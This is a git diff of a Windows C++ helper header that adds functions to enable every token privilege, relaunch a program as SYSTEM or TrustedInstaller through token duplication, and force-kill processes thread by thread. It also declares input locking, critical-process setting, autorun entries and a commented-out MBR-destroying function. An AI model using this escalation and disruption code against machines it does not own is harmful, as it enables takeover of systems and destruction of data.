@@ -1,14 +1,13 @@
 /**********************************************************
 @brief: 			 xbebhxx3函数合集
 @license: 	         GPLv3
-@version:  	         9.1
-@remarks:            编译时加 -std=gnu++11 -lgdi32 -lwsock32
+@version:  	         10.0
+@remarks:            编译时加 -lgdi32 -lwsock32
 @author:             xbehxx3
 @date:               2022/3/28
 @file:               x3-f.h
 @copyright           Copyright (c) 2022 xbebhxx3, All Rights Reserved
 ***************************************/
-//能不要删除注释吗，求求了QwQ
 //             ┏┓       ┏┓
 //            ┏┛┻━━━━━━━┛┻┓
 //            ┃     ?     ┃
@@ -22,58 +21,6 @@
 //              ┗┓┓┏━┳┓┏━━━━━━┓┓┏━┳┓┏┛
 //               ┃┫┫ ┃┫┫      ┃┫┫ ┃┫┫
 //               ┗┻┛ ┗┻┛      ┗┻┛ ┗┻┛
-
-/*****************目录*********************
-x3-f.h
-|- 权限操作
-|	 |- 获得debug权限
-|	 |- 判断管理员权限
-|	 |- 获得管理员权限
-|	 |- 获得TrustedInstaller权限
-|	 |- 以system权限打开可执行文件
-|	 |- 以TrustedInstaller权限打开可执行文件
-|- 进程操作
-|   |- 结束进程
-|   |- 判断进程是否存在 ,并返回进程id
-|   |- 获得进程路径
-|   |- 挂起进程
-|   |- 设置/解除关键进程
-|   |- 停止服务
-|   |- 启动服务
-|   |- 列出所有服务
-|- 串口操作
-|    |- 打开串口
-|    |- 关闭串口
-|    |- 发送数据
-|    |- 接收数据
-|- 注册表操作
-|     |- 读注册表
-|     |- 写注册表
-|     |- 删除注册表项
-|     |- 删除注册表值
-|     |- 设置开机自启
-|- 编/解码操作
-|	   |- Url编码
-|	   |- Url解码
-|	   |- 加密
-|- 改变颜色
-|    |- RGB初始化
-|    |- RGB设置
-|- 锁定鼠标键盘
-|- 获得鼠标位置
-|- 清屏
-|- str删除空格
-|- 获得当前ip
-|- 获得当前用户名
-|- 获得系统版本
-|- 执行cmd命令并获得返回值
-|- 居中输出
-|- 隐藏窗口
-|- 真·全屏
-|- 隐藏窗口
-|- 破坏mbr
-
- ****************************************/
 
 //模板
 /*********************************************
@@ -91,16 +38,72 @@ x3-f.h
  *  @date            日期
  *  @copyright       Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **********************************************/
-
+#ifndef X3_F_H
+#define X3_F_H
+#include <stdio.h>
 #include <Windows.h>
 #include <TlHelp32.h>
 #include <string>
-#include <bits/stdc++.h> //没有实际作用，只是懒得打部分头文件
-#ifndef CIRCLE_H
-#define CIRCLE_H
+#include <random>
+#include <time.h>
 
 using namespace std;
 
+//权限操作
+BOOL Debug();								//获得debug权限
+BOOL EnableAllPrivilege();					//获得debug权限
+BOOL IsProcessRunAsAdmin();					//判断是否以管理员权限运行
+BOOL RunAsAdmin();							//以管理员权限重启当前进程
+BOOL RunAsSystem();							//以System权限重启当前进程
+BOOL RunAsTi();								//以TrustedInstaller权限重启当前进程
+BOOL UseSystem(const char *exec);			// 以system权限打开可执行文件
+BOOL UseTrustedInstaller(const char *exec); //以TrustedInstaller权限打开可执行文件
+//进程操作
+BOOL KillProcess(DWORD dwProcessID);					//结束进程
+DWORD isProcess(const char *szImageName);				//判断进程是否存在 ,并返回进程id
+char *GetProcesslocation(DWORD dwProcessID);			//获得进程路径
+BOOL SuspendProcess(DWORD dwProcessID, BOOL fSuspend);	//挂起进程
+BOOL CriticalProcess(DWORD dwProcessID, BOOL fSuspend); //设置/解除关键进程
+BOOL CloseService(const char *service);					//停止服务
+BOOL _StartService(const char *service);				//启动服务
+void ListService();										//列出所有服务
+//串口操作
+class SerialPort //串口操作
+{
+public:
+	BOOL open(const char *portname, int baudrate, char parity, char databit, char stopbit, char synchronizeflag); // 打开串口
+	void close();																								  //关闭串口
+	int send(string dat);																						  //发送数据或写数据
+	string receive();																							  //接收数据或读数据
+private:
+	int pHandle[16];
+	char synchronizeflag;
+};
+//注册表操作
+char *ReadReg(const char *path, const char *key);					 //读注册表
+BOOL WriteReg(const char *path, const char *key, const char *value); //写注册表
+BOOL DelReg(const char *path);										 //写注册表
+BOOL DelRegValue(const char *path, const char *Value);				 //删除注册表项
+BOOL AutoRun(const char *name, BOOL fSuspend);						 //设置开机自启
+string CodeUrl(const string &URL);									 // Url编码
+string DecodeUrl(const string &URL);								 // Url解码
+char *x3code(char *c);												 // x3code加密
+//改变颜色
+void rgb_init();											  // RGB初始化
+void rgb_set(int wr, int wg, int wb, int br, int bg, int bb); // RGB设置
+//其他
+BOOL lockkm(BOOL lockb);					   //锁定鼠标键盘 (需要管理员权限)
+void mouxy(int &x, int &y);					   // 获得鼠标位置
+void cls();									   //清屏
+void delspace(string &s);					   // str删除空格
+char *getIp();								   //获得当前ip
+char *GetUser();							   //获得当前用户名
+const char *GetSystemVersion();				   //获得系统版本
+char *getCmdResult(const char *Cmd);		   //执行cmd命令并获得返回值
+void OutoutMiddle(const char str[], int y);	   //居中输出
+void full_screen(HWND hwnd);				   //全屏最大化
+long long radom(long long min, long long max); //生成随机数
+// void killmbr();//破坏mbr(very danger)默认注释,使用时删除注释
 //权限操作开始
 
 /**************************************************
@@ -116,36 +119,226 @@ BOOL Debug()
 {
 	HANDLE hToken;
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) //打开当前进程
+	{
+		CloseHandle(hToken); //关闭handle
 		return 0;
+	}
+
 	//添加权限
 	LUID luid;
 	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) //添加权限
+	{
+		CloseHandle(hToken); //关闭handle
 		return 0;
+	}
 	TOKEN_PRIVILEGES tkp;
 	tkp.PrivilegeCount = 1;
 	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 	tkp.Privileges[0].Luid = luid;
 	if (!AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL)) //判断是否成功
+	{
+		CloseHandle(hToken); //关闭handle
 		return 0;
+	}
+	CloseHandle(hToken); //关闭handle
 	return 1;
 }
 
 /**************************************************
- *  @brief         判断管理员权限
- *  @return        1管理员，0不是
- *  @note          头文件： #include <Windows.h>
+ *  @brief         获得所有进程权限
+ *  @Sample usage  EnableAllPrivilege();
+ *  @return        1成功，0失败
+ *  @author        xbebhxx3
+ *  @version       1.0
+ *  @date          2022/11/15
+ *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
+ **************************************************/
+BOOL EnableAllPrivilege()
+{
+	HANDLE hToken;
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) //打开当前进程
+	{
+		CloseHandle(hToken); //关闭handle
+		return 0;
+	}
+	//添加权限
+
+	LUID luid;
+	TOKEN_PRIVILEGES tkp;
+	tkp.PrivilegeCount = 1;
+	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	BOOL value;
+	value = LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeCreateTokenPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeAssignPrimaryTokenPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeLockMemoryPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeIncreaseQuotaPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeUnsolicitedInputPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeMachineAccountPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeTcbPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeSecurityPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeTakeOwnershipPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeLoadDriverPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeSystemProfilePrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeSystemProfilePrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeSystemtimePrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeProfileSingleProcessPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeIncreaseBasePriorityPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeCreatePagefilePrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeCreatePermanentPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeBackupPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeRestorePrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeShutdownPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeAuditPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeSystemEnvironmentPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeChangeNotifyPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeRemoteShutdownPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeUndockPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeSyncAgentPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeEnableDelegationPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeManageVolumePrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeImpersonatePrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeCreateGlobalPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeTrustedCredManAccessPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeRelabelPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeIncreaseWorkingSetPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeTimeZonePrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeCreateSymbolicLinkPrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	value = LookupPrivilegeValue(NULL, "SeDelegateSessionUserImpersonatePrivilege", &luid); //查找权限
+	tkp.Privileges[0].Luid = luid;
+	AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL); //更改权限
+
+	CloseHandle(hToken); //关闭handle
+	return value;
+}
+
+/**************************************************
+ *  @brief         判断是否以管理员权限运行
+ *  @return        1管理员,0不是
+ *  @note          头文件: #include <Windows.h>
  *  @Sample usage  IsProcessRunAsAdmin();
  *  @author        xbebhxx3
  *  @version       2.0
  *  @date          2022/3/28
  *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-bool IsProcessRunAsAdmin()
+BOOL IsProcessRunAsAdmin()
 {
 	BOOL bElevated = FALSE;
 	HANDLE hToken = NULL;
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) //打开进程
-		return FALSE;
+	{
+		CloseHandle(hToken); //关闭handle
+		return 0;
+	}
 	//获得进程token
 	TOKEN_ELEVATION tokenEle;
 	DWORD dwRetLen = 0;
@@ -158,21 +351,20 @@ bool IsProcessRunAsAdmin()
 }
 
 /**************************************************
- *  @brief         获得管理员权限
- *  @return        1已经是管理员
- *  @note          头文件： #include <Windows.h>
+ *  @brief         以管理员权限重启当前进程
+ *  @return        0已经是管理员
+ *  @note          头文件: #include <Windows.h>
  *  @Sample usage  RunAsAdmin();
  *  @Calls         IsProcessRunAsAdmin
- *  @remarks       必须依赖IsProcessRunAsAdmin判断是否为管理员权限
  *  @author        xbebhxx3
  *  @version       1.0
  *  @date          2022/3/28
  *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-bool RunAsAdmin()
+BOOL RunAsAdmin()
 {
 	if (IsProcessRunAsAdmin() == 1) //判断是否是管理员，防止循环启动
-		return 1;
+		return 0;
 
 	char szFilePath[MAX_PATH + 1] = {0};
 	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //获得当前文件路径
@@ -182,9 +374,32 @@ bool RunAsAdmin()
 }
 
 /**************************************************
- *  @brief         获得TrustedInstaller权限
+ *  @brief         以System权限重启当前进程
+ *  @return        1已经是System
+ *  @note          头文件: #include <Windows.h>
+ *  @Sample usage  RunAsTi();
+ *  @Calls         IsProcessRunAsAdmin,UseSystem,GetUser
+ *  @author        xbebhxx3
+ *  @version       1.0
+ *  @date          2022/9/7
+ *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
+ **************************************************/
+BOOL RunAsSystem()
+{
+
+	if (IsProcessRunAsAdmin() == 0 || lstrcmp(GetUser(), "SYSTEM") == 0) //判断是否有管理员权限，判断是否是SYSTEM权限,防止循环重启
+		return 0;
+
+	char szFilePath[MAX_PATH + 1] = {0};
+	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //获得当前文件路径
+	UseSystem(szFilePath);							//以TrustedInstaller权限打开
+	exit(0);										//退出防止2个窗口
+}
+
+/**************************************************
+ *  @brief         以TrustedInstaller权限重启当前进程
  *  @return        1已经是TrustedInstaller
- *  @note          头文件： #include <Windows.h>
+ *  @note          头文件: #include <Windows.h>
  *  @Sample usage  RunAsTi();
  *  @Calls         IsProcessRunAsAdmin,UseTrustedInstaller,GetUser
  *  @remarks       必须依赖IsProcessRunAsAdmin判断是否为管理员权限 必须依赖UseTrustedInstaller提权 必须依赖GetUser判断当前用户名
@@ -193,36 +408,31 @@ bool RunAsAdmin()
  *  @date          2022/9/7
  *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-string GetUser();
-bool UseTrustedInstaller(const char *exec);
-bool RunAsTi()
+BOOL RunAsTi()
 {
-	RunAsAdmin(); //以管理员权限运行，UseTrustedInstaller需要管理员权限
 
-	if (GetUser() != "SYSTEM") //判断是否是SYSTEM权限,防止循环重启
-	{
-		char szFilePath[MAX_PATH + 1] = {0};
-		GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //获得当前文件路径
-		UseTrustedInstaller(szFilePath);				//以TrustedInstaller权限打开
-		exit(0);										//退出防止2个窗口
-	}
-	else
-		return 1;
+	if (IsProcessRunAsAdmin() == 0 || lstrcmp(GetUser(), "SYSTEM") == 0) //判断是否有管理员权限，判断是否是SYSTEM权限,防止循环重启
+		return 0;
+
+	char szFilePath[MAX_PATH + 1] = {0};
+	GetModuleFileNameA(NULL, szFilePath, MAX_PATH); //获得当前文件路径
+	UseTrustedInstaller(szFilePath);				//以TrustedInstaller权限打开
+	exit(0);										//退出防止2个窗口
 }
 
 /**************************************************
  *  @brief         以system权限打开可执行文件
+ *  @param         exec:可执行程序路径
  *  @return        1成功,0失败
- *  @note          头文件： #include <Windows.h>
+ *  @note          头文件: #include <Windows.h>
  *  @calls          Debug
- *  @Sample usage  UseSystem("cmd");
+ *  @Sample usage  UseSystem("c:\\windows\\system32\\cmd.exe");
  *  @author        xbebhxx3
  *  @version       1.0
  *  @date          2022/3/28
  *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-int isProcess(const char *szImageName);
-bool UseSystem(const char *exec)
+BOOL UseSystem(const char *exec)
 {
 	int num = MultiByteToWideChar(0, 0, exec, -1, NULL, 0);
 	wchar_t *wexec = new wchar_t[num];
@@ -254,22 +464,26 @@ bool UseSystem(const char *exec)
 		RevertToSelf();
 	DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle); // 复制具有SYSTEM权限的令牌
 
-	return CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, wexec, NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&startupInfo, &processInformation); // 创建指定令牌启动的进程
+	BOOL value = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, wexec, NULL, 0, NULL, NULL, (LPSTARTUPINFOW)&startupInfo, &processInformation); // 创建指定令牌启动的进程
+	CloseHandle(tokenHandle);
+	CloseHandle(duplicateTokenHandle);
+	CloseHandle(processHandle); //关闭handle
+	return value;
 }
 
 /**************************************************
  *  @brief         以TrustedInstaller权限打开可执行文件
+ *  @param         exec:可执行程序路径
  *  @return        1成功,0失败
- *  @note          头文件： #include <Windows.h>
+ *  @note          头文件: #include <Windows.h>
  *  @Sample usage  UseTrustedInstaller("cmd");
  *  @calls          Debug
- *  @remarks       编译时加 -std=gnu++11
  *  @author        xbebhxx3
  *  @version       5.0
  *  @date          2022/8/10
  *  @copyright     Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-bool UseTrustedInstaller(const char *exec)
+BOOL UseTrustedInstaller(const char *exec)
 {
 	int num = MultiByteToWideChar(0, 0, exec, -1, NULL, 0);
 	wchar_t *wexec = new wchar_t[num];
@@ -277,7 +491,8 @@ bool UseTrustedInstaller(const char *exec)
 
 	Debug(); //获得debug权限
 
-	HANDLE hSystemToken = nullptr, IhDupToken = nullptr, hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //创建进程快照
+	HANDLE hSystemToken, IhDupToken;
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //创建进程快照
 	PROCESSENTRY32W pe = {0};
 	pe.dwSize = sizeof(PROCESSENTRY32W);
 	Process32FirstW(hSnapshot, &pe);
@@ -286,21 +501,19 @@ bool UseTrustedInstaller(const char *exec)
 	OpenProcessToken(OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID), MAXIMUM_ALLOWED, &hSystemToken); // 获取指定进程的句柄令牌
 	SECURITY_ATTRIBUTES ItokenAttributes;
 	ItokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
-	ItokenAttributes.lpSecurityDescriptor = nullptr;
+	ItokenAttributes.lpSecurityDescriptor = '\0';
 	ItokenAttributes.bInheritHandle = FALSE;
 	DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, &ItokenAttributes, SecurityImpersonation, TokenImpersonation, &IhDupToken); //打开令牌
 	ImpersonateLoggedOnUser(IhDupToken);																						//创建进程所必须的结构
 	//声明之后需要的变量
-	HANDLE hTIProcess = nullptr, hTIToken = nullptr, hDupToken = nullptr;
-	HANDLE hToken = nullptr;
-	LPVOID lpEnvironment = nullptr;
-	LPWSTR lpBuffer = nullptr;
-	SC_HANDLE hSCManager = nullptr;
-	SC_HANDLE hService = nullptr;
+	HANDLE hTIProcess, hTIToken, hDupToken, hToken;
+	LPVOID lpEnvironment;
+	LPWSTR lpBuffer;
+	SC_HANDLE hSCManager, hService;
 	DWORD dwProcessId = 0;
 	BOOL res = TRUE, started = TRUE;
 	//启动TrustedInstaller服务并获得id
-	hSCManager = OpenSCManager(nullptr, SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE);
+	hSCManager = OpenSCManager('\0', SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE);
 	hService = OpenServiceW(hSCManager, L"TrustedInstaller", GENERIC_READ | GENERIC_EXECUTE); //打开TrustedInstaller服务
 	SERVICE_STATUS_PROCESS statusBuffer = {0};
 	DWORD bytesNeeded;
@@ -309,7 +522,7 @@ bool UseTrustedInstaller(const char *exec)
 		switch (statusBuffer.dwCurrentState)
 		{
 		case SERVICE_STOPPED:
-			started = StartServiceW(hService, 0, nullptr); //启动TrustedInstaller服务
+			started = StartServiceW(hService, 0, '\0'); //启动TrustedInstaller服务
 		case SERVICE_STOP_PENDING:
 			Sleep(statusBuffer.dwWaitHint); //等待服务启动
 		case SERVICE_RUNNING:
@@ -322,13 +535,13 @@ bool UseTrustedInstaller(const char *exec)
 
 	SECURITY_ATTRIBUTES tokenAttributes;
 	tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
-	tokenAttributes.lpSecurityDescriptor = nullptr;
+	tokenAttributes.lpSecurityDescriptor = '\0';
 	tokenAttributes.bInheritHandle = FALSE;
 	DuplicateTokenEx(hTIToken, MAXIMUM_ALLOWED, &tokenAttributes, SecurityImpersonation, TokenImpersonation, &hDupToken); //复制带有TrustedInstaller权限的令牌
 	OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &hToken);															  // 获取指定进程的句柄
 
-	DWORD nBufferLength = GetCurrentDirectoryW(0, nullptr);
-	lpBuffer = (LPWSTR)(new wchar_t[nBufferLength]{0});
+	DWORD nBufferLength = GetCurrentDirectoryW(0, '\0');
+	lpBuffer = (LPWSTR)(new wchar_t[nBufferLength]);
 	GetCurrentDirectoryW(nBufferLength, lpBuffer); //输出操作系统路径
 
 	STARTUPINFOW startupInfo;
@@ -337,44 +550,65 @@ bool UseTrustedInstaller(const char *exec)
 	PROCESS_INFORMATION processInfo;
 	ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));
 
-	return CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, nullptr, wexec, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, lpBuffer, &startupInfo, &processInfo); //打开
+	BOOL value = CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, '\0', wexec, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, lpBuffer, &startupInfo, &processInfo); //打开
+	CloseHandle(hSystemToken);
+	CloseHandle(hTIProcess);
+	CloseHandle(hToken);
+	CloseHandle(IhDupToken);
+	CloseHandle(hSnapshot);
+	CloseServiceHandle(hSCManager);
+	CloseServiceHandle(hService); //关闭handle
+	return value;
 }
-
-//权限操作结束
 
 //进程操作开始
 
 /**************************************************
  *  @brief          结束进程
- *  @param          szImageName:进程名
- *  @note           头文件： #include <Windows.h> #include <TlHelp32.h> #include <string>
- *  @Sample usage 	KillProcess("cmd.exe");
+ *  @param          szImageName:进程id
+ *  @note           头文件: #include <Windows.h> #include <TlHelp32.h>
+ *  @Sample usage 	KillProcess(1000);
  *  @author         xbebhxx3
  *  @version        2.0
  *  @date           2022/3/15
  *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
  **************************************************/
-void KillProcess(const char *szImageName)
+BOOL KillProcess(DWORD dwProcessID)
 {
-	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};					   //获得进程列表
-	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //拍摄快照
-	BOOL bRet = Process32First(hProcess, &pe);						   //检索快照中第一个进程信息
-
-	while (bRet)
-	{ //判断不是最后一个进程，历遍所有
-		if (lstrcmp(szImageName, pe.szExeFile) == 0)
-		{																				   //判断是不是要结束的进程
-			TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID), 0); //打开进程并杀死
+	HANDLE Token = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessID); //打开进程
+	
+	if (!TerminateProcess(Token, 0) || Token == NULL)				   //杀死进程,如果未成功使用另一个方法
+	{
+		CloseHandle(Token);															 //关闭HANDLE
+		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID); //创建要结束进程的线程快照
+		if (hSnapshot != INVALID_HANDLE_VALUE)
+		{
+			BOOL rtn = false;
+			THREADENTRY32 te = {sizeof(te)};
+			BOOL fOk = Thread32First(hSnapshot, &te);
+			for (; fOk; fOk = Thread32Next(hSnapshot, &te)) //查找线程
+			{
+				if (te.th32OwnerProcessID == dwProcessID)
+				{
+					HANDLE hThread = OpenThread(THREAD_TERMINATE, FALSE, te.th32ThreadID); //打开线程
+					if (TerminateThread(hThread, 0))									   //结束线程
+						rtn = true;
+					CloseHandle(hThread); //关闭HANDLE
+				}
+			}
+			CloseHandle(hSnapshot); //关闭HANDLE
+			return rtn;
 		}
-		bRet = Process32Next(hProcess, &pe); //下一个进程
+		return false;
 	}
-	return;
+	CloseHandle(Token); //关闭HANDLE
+	return true;
 }
 
 /**************************************************
  *  @brief          判断进程是否存在 ,并返回进程id
  *  @param          szImageName:进程名
- *  @note           头文件： #include <Windows.h> #include <TlHelp32.h> #include <string>
+ *  @note           头文件: #include <Windows.h> #include <TlHelp32.h> #include <string>
  *  @Sample usage 	isProcess("cmd.exe");
  * 	@return         0不存在 非0为进程id
  * 	@author         xbebhxx3
@@ -382,7 +616,7 @@ void KillProcess(const char *szImageName)
  * 	@date           2022/3/15
